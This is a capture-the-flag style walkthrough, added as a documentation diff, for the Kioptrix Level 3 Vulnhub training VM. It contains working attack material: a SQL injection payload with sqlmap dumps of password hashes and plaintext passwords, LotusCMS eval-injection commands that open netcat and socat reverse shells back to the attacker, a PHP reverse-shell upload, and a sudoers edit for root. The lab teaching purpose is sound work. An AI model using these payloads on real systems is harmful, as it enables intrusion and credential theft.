@@ -1,0 +1,514 @@
+.. include:: /pentest_links.txt
+
+.. _Kioptrix3:
+
+****************
+Kioptrix Level 3
+****************
+
+Setup
+=====
+
+Setting up the VMware VM
+------------------------
+
+The challenge is `Kioptrix: Level 1.2 (#3) <https://www.vulnhub.com/entry/kioptrix-level-12-3,24/>`_, the third of the `Vulnhub Kioptrix Series <https://www.vulnhub.com/series/kioptrix,8/>`_. The VM comes packaged as `KVM3.rar <http://www.kioptrix.com/dlvm/KVM3.rar>`_, which is a rar archive containing a VMware vmdk file. If you have any setup troubles you can add the disk to an existing Linux VM, mount it, make a copy of :file:`/etc/shadow`, and delete the root password hash. This will provide passwordless root access to fix any issues. See :ref:`VMSetup` for background on using the VMware vmdk file. Kioptrix3 runs Ubuntu 8.04.3 LTS i686.
+
+Setting up your environment
+---------------------------
+
+If you want to easily cut-and-paste from the sample code below, download :download:`kioptrix3_setup.sh`: 
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/kioptrix3
+  mkdir -p $PT
+  cd $PT
+  # download kioptrix3_setup.sh
+  curl --silent --remote-name https://pentest-meetup.appspot.com/html/_downloads/kioptrix3_setup.sh
+  # edit as needed; later the recon will give you TARGET IP
+  source kioptrix3_setup.sh
+
+
+Reconnaisance
+=============
+
+Network reconnaissance
+----------------------
+
+Start with some standard network reconnaissance looking for the vulnerable host:
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/kioptrix3
+  source $PT/kioptrix3_setup.sh
+  cd $PT/nmap
+  $SUDO nmap -sn -PE -oA nmap_sn $SUBNET
+  $SUDO chown $USER.$USER nmap_sn.*
+  # use the grep-able output to get a list of target hosts
+  grep Up nmap_sn.gnmap | cut -d" " -f2 > $TARGETS
+  # use the xml output to get an html report
+  xsltproc nmap_sn.xml -o nmap_sn.html
+
+Here we know $TARGET and can fill it in $PT/kioptrix3_setup.sh and also edit :file:`/etc/hosts` to add "kioptrix3.com" (``echo "$TARGET kioptrix3.com" | $SUDO tee -a /etc/hosts``).
+
+.. code-block:: bash
+
+  $SUDO nmap -A -vv -T3 --max-retries 5 -Pn -oA nmap_A $TARGET
+  $SUDO chown $USER.$USER nmap_A.*
+  xsltproc nmap_A.xml -o nmap_A.html
+
+Running this gives reveals:
+
+* port 22: OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+
+* port 80: Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+
+  A quick search for PHP/5.2.4-2ubuntu5.6 indicates the target is Ubuntu Hardy (8.04).
+
+Port 80 reconnaissance via dirb & nikto
+---------------------------------------
+
+Out of habit we do :program:`dirb` and :program:`nikto` scans:
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/kioptrix3
+  source $PT/kioptrix3_setup.sh
+  cd $PT/spider
+  dirb  http://$HOST/ -o dirb.txt
+  nikto -output nikto.html -C all -host $HOST -port 80
+
+The most significant finding was finding phpmyadmin, indicating the MySQL database.
+
+Viewing the web site
+====================
+
+The next bit of reconnaissance was to view the web site. Two significant findings are detailed here, with only an exploit for the first provided.
+
+Gallarific SQL injection exploit
+--------------------------------
+
+Finding Gallarific
+^^^^^^^^^^^^^^^^^^
+
+The home page brags about the new `gallery <http://kioptrix3.com/gallery/>`_ system provided. Looking at the tab on the gallery web page you'll see "Gallarific".
+
+Gallarific exploit candidate
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+`Search Gallarific in Exploit Database <https://www.exploit-db.com/search/?action=search&text=gallarific&e_author=>`_ returns `GALLARIFIC PHP Photo Gallery Script (gallery.php) SQL Injection <https://www.exploit-db.com/exploits/15891/>`_. (``searchsploit gallarific`` also returns the SQL injection.)
+
+.. code-block:: console
+
+  ===[ Exploit ]===
+  www.site.com/gallery.php?id=null[Sql Injection]
+
+  www.site.com/gallery.php?id=null+and+1=2+union+select+1,group_concat(userid,0x3a,username,0x3a,password),3,4,5,6,7,8+from+gallarific_users--
+
+Since the gallery is at http://kioptrix3.com/gallery/ the injection point is http://kioptrix3.com/gallery/gallery.php?id=null. To help understand how the SQL injection occurs, here is the actual PHP query:
+
+.. code-block:: php
+
+  $parent_id = $_GET['id'];
+  $selcat="SELECT * from gallarific_galleries where parentid=$parent_id order by parentid,sort,name";
+  $selcat2=mysql_query($selcat) or die(mysql_error()."Could not select category");
+
+By setting ``id`` to:
+
+.. code-block:: mysql
+
+  null and 1=2
+  union select 1,group_concat(userid,0x3a,username,0x3a,password),3,4,5,6,7,8
+    from gallarific_users
+  --
+
+the query becomes
+
+.. code-block:: mysql
+
+  SELECT * from gallarific_galleries where parentid=null and 1=2
+  union select 1,group_concat(userid,0x3a,username,0x3a,password),3,4,5,6,7,8 
+    from gallarific_users
+  -- order by parentid,sort,name
+
+The first SELECT returns nothing due to "1=2" always being false; the union is any arbitrary query returning (in this case) 8 columns; and the trailing "--" on the id value comments out the original "order by parentid,sort,name". So the sql query has effectively been hijacked into an arbitrary query. :program:`sqlmap` can automate this for you, allowing mapping the complete database that the application has access to.
+
+LotusCMS gets arbitrary PHP execution = file download/upload, reverse shell
+---------------------------------------------------------------------------
+
+If you just want the exploit then feel free to skip on ahead. This is included only for those wishing to study in depth, including reverse shells.
+
+Finding LotusCMS
+^^^^^^^^^^^^^^^^
+
+Visiting the website reveals a number of pages including a LotusCMS login page:
+
+.. code-block:: console
+  :emphasize-lines: 1,3,5
+
+  hacker@kali:~/pentest/kioptrix3/spider$ curl --silent http://kioptrix3.com/index.php?system=Admin
+  ###################### SNIP ######################
+    <title>LotusCMS Administration</title>
+  ###################### SNIP ######################
+    Proudly Powered by: <a href="http://www.lotuscms.org">LotusCMS</a></li>
+  ###################### SNIP ######################
+
+The problem with LotusCMS's router.php
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+router.php code
+"""""""""""""""
+
+We're going to go out of order here and show the problem code before we discover the vulnerabilities. This hopefully will help you understand them when we get to then next. Here is the code for :file:`core/lib/router.php` showing the unmodified, unchecked user inputs ``$plugin`` and ``$page`` are concatenated in an ``include`` and ``eval`` statment:
+
+.. code-block:: php
+  :emphasize-lines: 1,8,11,14,16,19
+
+  class Router{
+	
+	  /**
+	   * This routes any request from get variables into the LotusCMS system.
+	   */
+	  public function Router(){
+		  //Get page request (if any)
+		  $page = $this->getInputString("page", "index");
+		
+		  //Get plugin request (if any)
+		  $plugin = $this->getInputString("system", "Page");
+		
+		  //If there is a request for a plugin
+		  if(file_exists("core/plugs/".$plugin."Starter.php")){
+			  //Include Page fetcher
+			  include("core/plugs/".$plugin."Starter.php");
+
+			  //Fetch the page and get over loading cache etc...
+			  eval("new ".$plugin."Starter('".$page."');");
+
+router.php downloading files
+""""""""""""""""""""""""""""
+
+Imagine the following query:
+
+  http://kioptrix3.com/index.php?system=../../../../../../../../../../etc/passwd%00.html
+
+``$page`` defaults to "index"; ``$plugin`` is set to the ``system`` parameter above; the ``file_exists`` test succeeds because the ``system`` value has an embedded null byte ("%00") (but the ".html" is needed to let PHP know to display the file); the ``include`` includes the file :file:`/etc/passwd`; and the ``eval`` errors out and leaves a mess after :file:`/etc/passwd`. And so we've downloaded the file plus a little garbage to clean out.
+
+router.php executing arbitrary PHP
+""""""""""""""""""""""""""""""""""
+
+Imagine the following query:
+
+  http://kioptrix3.com/index.php?page=index');eval(base64_decode(...));#
+
+``$page`` above is set to the ``page`` parameter; ``$plugin`` defaults to "Page"; the ``file_exists`` test succeeds with the "Page" plugin; the "Page" plugin is included; and finally the ``eval`` line runs. It looks like this:
+
+.. code-block:: php
+
+  eval("new ".$plugin."Starter('".$page."');");
+  # substituting "Page" for $plugin, long string for $page we get
+  eval("new "."Page"."Starter('"."index');eval(base64_decode(...));#"."');");
+  # concatenating strings we get
+  eval("new Page.Starter('index');eval(base64_decode(...));#');");
+  # what's eval'ed is (the # comments out the trailing "');" to prevent an error)
+  new Page.Starter('index');eval(base64_decode(...));#');
+
+Since ... can be any base64-encoded PHP, arbitrary PHP code can be run.
+
+LotusCMS exploit candidates
+^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Now we pick up with how we discovered the vulnerabilities. The web page for LotusCMS is found at `kevinbluett/LotusCMS-Content-Management-System <https://github.com/kevinbluett/LotusCMS-Content-Management-System>`_. `Search LotusCMS in Exploit Database <https://www.exploit-db.com/search/?action=search&text=lotuscms&e_author=>`_ returns these exploits:
+
+* `lotuscms 3.0.3 - Multiple Vulnerabilities <https://www.exploit-db.com/exploits/16982/>`_ include a number of XSS vulnerabilities. We won't pursue those now.
+
+* `Lotus CMS Fraise 3.0 - LFI - Remote Code Execution Exploit <https://www.exploit-db.com/exploits/15964/>`_
+
+  This one is interesting but flawed. The "testFileInclusion" function tries http://kioptrix3.com/index.php?system=../../../../../../../../../../etc/passwd%00 but that's missing a trailing extension (".html"). After fixing that the remote shell fails so it needs more work; for now we'll keep the exploit in mind if other exploits fail. But it does demonstrate that we can look at any file on the system accessible to the web server:
+
+  .. code-block:: console
+
+    FULLPATH=/etc/passwd
+    FILENAME=${FULLPATH##*/}
+    curl --silent \
+      http://kioptrix3.com/index.php?system=../../../../../../../../../..$FULLPATH%00.html | \
+      sed -e '/^<br \/>/q' | head -n -1 > $FILENAME
+
+  Keep in mind that this file inclusion vulnerability allows executing any php files you might be able to upload.
+
+* `LotusCMS 3.0 eval() Remote Command Execution <https://www.exploit-db.com/exploits/18565/>`_ is a metasploit exploit we'll pursue.
+
+  .. code-block:: ruby
+
+    'Description'    => %q{
+            This module exploits a vulnerability found in Lotus CMS 3.0's Router()
+        function.  This is done by embedding PHP code in the 'page' parameter,
+        which will be passed to a eval call, therefore allowing remote code execution.
+
+            The module can either automatically pick up a 'page' parameter from the
+        default page, or manually specify one in the URI option.  To use the automatic
+        method, please supply the URI with just a directory path, for example: "/lcms/".
+        To manually configure one, you may do: "/lcms/somepath/index.php?page=index"
+    },
+
+Executing arbitrary PHP - simple reverse shell
+""""""""""""""""""""""""""""""""""""""""""""""
+
+Let's explore this last vulnerability a bit more. If you investigate the metasploit exploit you'll see you can execute arbitrary PHP code very simply:
+
+.. code-block:: bash
+
+  # Get base64 encoded PHP code - here a reverse shell
+  #   Reverse shell assumes "socat - TCP-LISTEN:$PORT" on Kali
+  CMD='passthru("nc -e /bin/bash '"$KALI $PORT"'");'
+  CMD64=$(echo "$CMD" | base64 -w 0)
+  echo -n $CMD64 | base64 -d
+  # PAGE=index');eval(base64_decode(...));#
+  PAGE="index'"');eval(base64_decode("'$CMD64'"));#'
+  curl -v http://kioptrix3.com/index.php \
+    --data-urlencode page="$PAGE"
+  # First thing in reverse shell
+  # python -c 'import pty; pty.spawn("/bin/bash")'
+
+Also note that the resulting terminal is dumb.
+
+Executing arbitrary PHP - reverse shell with pty
+""""""""""""""""""""""""""""""""""""""""""""""""
+
+In fact you can extend the above to upload arbitrary files. (Note that this is much less stealthy than exploiting kioptrix3's ability to upload gallery files.) To demonstrate this we'll take a side excursion to upload a version of a php reverse shell that includes a pty following `Using SSH Without A TTY - Other potential solutions <http://pentestmonkey.net/blog/ssh-with-no-tty>`_:
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/kioptrix3
+  source $PT/kioptrix3_setup.sh
+  cd $PT/exploit
+  # Download pentestmonkey reverse php shell
+  REVSH="php-reverse-shell.php"
+  curl --silent --remote-name http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
+  tar -xvzf php-reverse-shell-1.0.tar.gz
+  cp php-reverse-shell-1.0/$REVSH .
+  # Change to our ip/port
+  sed -i "s/127.0.0.1/$KALI/" $REVSH
+  sed -i "s/1234/$PORT/" $REVSH
+  # change 0 => array("pipe", "r")  to  0 => array("pty")
+  sed -i 's/\([012]\) => array("pipe", "[rw]")/\1 => array("pty")/' $REVSH
+  # prepare to upload the reverse shell
+  socat -u FILE:$REVSH TCP-LISTEN:$PORT
+
+Then pull the file into a writeable directory on the web server (:file:`/home/www/kioptrix3.com/gallery/photos/` will work):
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/kioptrix3
+  source $PT/kioptrix3_setup.sh
+  CMD='passthru("cd /home/www/kioptrix3.com/gallery/photos/; nc '"$KALI $PORT"' > /home/www/kioptrix3.com/gallery/photos/php-reverse-shell.php; chmod +x php-reverse-shell.php;");'
+  CMD64=$(echo "$CMD" | base64 -w 0)
+  echo -n $CMD64 | base64 -d
+  # PAGE=index');eval(base64_decode(...));#
+  PAGE="index'"');eval(base64_decode("'$CMD64'"));#'
+  curl -v http://kioptrix3.com/index.php \
+    --data-urlencode page="$PAGE"
+
+At this point you can pop a reverse shell with a pty by first starting a Kali listener:
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/kioptrix3
+  source $PT/kioptrix3_setup.sh
+  # get LINES, COLUMNS available so can set later
+  echo $LINES,$COLUMNS
+  # try "cfmakeraw" or "rawer" if available vs. "raw,echo=0"
+  socat -,raw,echo=0 TCP-LISTEN:$PORT
+  # do this first in new session
+  export TERM=linux
+  echo $LINES,$COLUMNS
+  # to change LINES and COLUMNS (set to valid values)
+  export LINES=24;export COLUMNS=80
+
+Then open the reverse shell we just uploaded:
+
+.. code-block:: bash
+
+  curl -v http://kioptrix3.com/gallery/photos/php-reverse-shell.php
+
+Executing arbitrary PHP - even better socat-based reverse shell
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+
+The above reverse shell is better but still lacking tab completion, ... . You can get that if you have :program:`socat` on both ends. But how to get :program:`socat` on the target machine? The source is available at `dest-unreach / socat <http://www.dest-unreach.org/socat/>`_. Find the latest download link then on the target host:
+
+.. code-block:: bash
+
+  cd /tmp
+  # use curl or wget
+  #   later socat versions did not build
+  wget  http://www.dest-unreach.org/socat/download/socat-1.7.3.0.tar.gz 2>&1
+  tar -xvzf socat-1.7.3.0.tar.gz
+  cd socat-*
+  ./configure 2>&1
+  make 2>&1
+  cp socat /home/www/kioptrix3.com/data/
+
+Then start the listener on Kali via:
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/kioptrix3
+  source $PT/kioptrix3_setup.sh
+  # get LINES, COLUMNS available so can set later
+  echo $LINES,$COLUMNS
+  # try "cfmakeraw" or "rawer" if available vs. "raw,echo=0"
+  socat -,raw,echo=0 TCP-LISTEN:$PORT
+  # do this first in new session
+  export TERM=linux
+  echo $LINES,$COLUMNS
+  # to change LINES and COLUMNS
+  # export LINES=NN;export COLUMNS=MM
+
+
+Then from the target machines PHP invoke socat using the command ``socat TCP-CONNECT:$KALI:$PORT EXEC:"/bin/bash -li",pty,stderr,setsid,sigint,sane``. You'll have tab completion, can use :program:`vi`, ... . You'll need to set TERM in order to run :program:`/usr/local/bin/ht`:
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/kioptrix3
+  source $PT/kioptrix3_setup.sh
+  SOCAT="/home/www/kioptrix3.com/data/socat"
+  CMD='passthru("'"$SOCAT"' TCP-CONNECT:'"$KALI:$PORT"' EXEC:'"'"'/bin/bash -li'"'"',pty,stderr,setsid,sigint,sane");'
+  CMD64=$(echo -n "$CMD" | base64 -w 0)
+  PAGE="index'"');eval(base64_decode("'$CMD64'"));#'
+  curl -v http://kioptrix3.com/index.php \
+    --data-urlencode page="$PAGE"
+
+So LotusCMS allows us to easily download/upload files, execute arbitrary PHP scripts, and pop php reverse shells with a pty which can execute :program:`/usr/local/bin/ht`. Note that since the file upload uses :program:`nc` on a non-standard port it's inferior to using the kioptrix3 built-in gallery file upload.
+
+
+The Exploit
+===========
+
+Exploiting the Gallarific SQL injection
+---------------------------------------
+
+The actual :file:`gallery.php` page is found at http://kioptrix3.com/gallery/gallery.php:
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/kioptrix3
+  source $PT/kioptrix3_setup.sh
+  cd $PT/sqlmap
+  rm -rf sqlmap
+  URL='http://kioptrix3.com/gallery/gallery.php?id=null'
+  sqlmap -u "$URL" --batch --random-agent --output-dir $PWD/sqlpmap \
+    --dbms=MySQL --banner --current-user --is-dba --current-db --users --passwords --dbs
+
+Here's the important results from this SQL injection:
+
+.. code-block:: console
+
+  web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+  web application technology: PHP 5.2.4, Apache 2.2.8
+  banner:    '5.0.51a-3ubuntu5.4'
+  current user:    'root@localhost'
+  current database:    'gallery'
+  current user is DBA:    True
+  [*] debian-sys-maint [1]:
+      password hash: *F46D660C8ED1B312A40E366A86D958C6F1EF2AB8
+  [*] root [1]:
+      password hash: *47FB3B1E573D80F44CD198DC65DE7764795F948E
+  available databases [3]:                                                       
+  [*] gallery
+  [*] information_schema
+  [*] mysql
+
+So we'll just see what tables are in gallery:
+
+.. code-block:: bash
+
+  sqlmap -u "$URL" --batch --random-agent --output-dir $PWD/sqlpmap \
+    --dbms=MySQL -D gallery --tables
+
+And this returns:
+
+.. code-block:: console
+
+  Database: gallery                                                              
+  [7 tables]
+  +----------------------+
+  | dev_accounts         |
+  | gallarific_comments  |
+  | gallarific_galleries |
+  | gallarific_photos    |
+  | gallarific_settings  |
+  | gallarific_stats     |
+  | gallarific_users     |
+  +----------------------+
+
+So we'll go after table dev_accounts first:
+
+.. code-block:: bash
+
+  sqlmap -u "$URL" --batch --random-agent --output-dir $PWD/sqlpmap \
+    --dbms=MySQL -D gallery -T deb_accounts --dump
+
+And this returns:
+
+.. code-block:: console
+
+  Database: gallery
+  Table: dev_accounts
+  [2 entries]
+  +----+------------+---------------------------------------------+
+  | id | username   | password                                    |
+  +----+------------+---------------------------------------------+
+  | 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   |
+  | 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e (starwars) |
+  +----+------------+---------------------------------------------+
+
+And then table gallarific_users:
+
+.. code-block:: bash
+
+  sqlmap -u "$URL" --batch --random-agent --output-dir $PWD/sqlpmap \
+    --dbms=MySQL -D gallery -T deb_accounts --dump
+
+And this returns:
+
+.. code-block:: console
+
+  Database: gallery
+  Table: gallarific_users
+  [1 entry]
+  +--------+---------+---------+---------+----------+----------+----------+-----------+----------+-----------+------------+-------------+
+  | userid | photo   | email   | website | username | lastname | joincode | usertype  | password | firstname | datejoined | issuperuser |
+  +--------+---------+---------+---------+----------+----------+----------+-----------+----------+-----------+------------+-------------+
+  | 1      | <blank> | <blank> | <blank> | admin    | User     | <blank>  | superuser | n0t7t1k4 | Super     | 1302628616 | 1           |
+  +--------+---------+---------+---------+----------+----------+----------+-----------+----------+-----------+------------+-------------+
+
+Shell access to root
+--------------------
+
+Try :program:`ssh` with the passwords and loneferret/starwars gets you in. Trying ``sudo -l`` shows you can run the hex editor :program:`/usr/local/bin/ht`. `sebastianbiallas/ht <https://github.com/sebastianbiallas/ht>`_ is an editor that happens to be suid root on this machine allowing us to edit system files like :file:`/etc/sudoers`. (Note - I disabled keyboard shortcuts on my Kali terminal so I could use them in the :program:`ht` editor.) Here we get root:
+
+.. code-block:: console
+  :emphasize-lines: 1,5-8,13-
+
+  hacker@kali:~/pentest/kioptrix3/exploit$ ssh loneferret@kioptrix3.com
+  loneferret@kioptrix3.com's password: 
+  Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
+  ###################### SNIP ######################
+  loneferret@Kioptrix3:/tmp$ sudo -l
+  User loneferret may run the following commands on this host:
+      (root) NOPASSWD: !/usr/bin/su
+      (root) NOPASSWD: /usr/local/bin/ht
+  loneferret@Kioptrix3:~$ ls -l /usr/local/bin/ht
+  -rwsr-sr-x 1 root root 2072344 2011-04-16 07:26 /usr/local/bin/ht
+  loneferret@Kioptrix3:/tmp$ # edit sudoers file giving loneferret root access
+  loneferret@Kioptrix3:/tmp$ /usr/local/bin/ht /etc/sudoers
+  loneferret@Kioptrix3:/tmp$ sudo -l
+  User loneferret may run the following commands on this host:
+      (root) NOPASSWD: /bin/su
+      (root) NOPASSWD: /usr/local/bin/ht
+  loneferret@Kioptrix3:/tmp$ sudo su -
+  root@Kioptrix3:~# id
+  uid=0(root) gid=0(root) groups=0(root)
+
+And so we have root.
+
